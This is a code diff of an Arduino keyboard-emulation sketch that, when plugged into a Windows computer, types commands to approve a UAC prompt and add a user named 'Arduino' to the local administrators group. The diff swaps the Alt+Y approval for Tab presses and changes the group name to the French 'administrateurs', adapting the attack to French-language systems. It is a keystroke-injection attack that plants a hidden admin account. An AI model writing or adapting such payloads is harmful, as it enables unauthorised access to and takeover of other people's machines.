@@ -20,9 +20,13 @@ void setup()
   delay(500);
 
   // klik "Yes"
-  Keyboard.press(KEY_LEFT_ALT);
-  delay(500);
-  Keyboard.press('y');
+  Keyboard.press(KEY_TAB);
+  Keyboard.release(KEY_TAB);
+  Keyboard.press(KEY_TAB);
+  Keyboard.release(KEY_TAB);
+  Keyboard.press(KEY_TAB);
+  Keyboard.release(KEY_TAB);
+  typeKey(KEY_RETURN);
   Keyboard.releaseAll();
   delay(500);
 
@@ -32,7 +36,7 @@ void setup()
   delay(100);
 
   // make that user become admin  
-  Keyboard.print("net localgroup administrators Arduino /add");
+  Keyboard.print("net localgroup administrateurs Arduino /add");
   typeKey(KEY_RETURN);
   delay(100);
 
@@ -53,4 +57,3 @@ void typeKey(int key){
   delay(500);
   Keyboard.release(key);
 }
-
